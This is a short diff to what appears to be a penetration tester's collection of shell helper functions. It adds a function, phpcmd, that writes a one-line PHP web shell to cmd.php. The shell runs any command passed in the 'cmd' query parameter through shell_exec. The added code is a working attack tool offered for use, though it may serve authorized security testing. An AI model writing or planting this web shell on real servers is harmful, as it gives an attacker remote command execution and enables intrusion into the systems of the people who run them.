@@ -360,3 +360,8 @@ function genhosts() {
 
     rm -f "$tmp_file"
 } # Description: Generate and append to /etc/hosts using netexec for a given IP address and print new entries
+function phpcmd() {
+    local file="cmd.php"
+    echo '<?php echo htmlspecialchars(shell_exec($_GET["cmd"])); ?>' > "$file"
+    echo "[+] Wrote '<?php echo htmlspecialchars(shell_exec(\$_GET[\"cmd\"])); ?>' to $file"
+} # Description: Drops a php webshell in the current directory
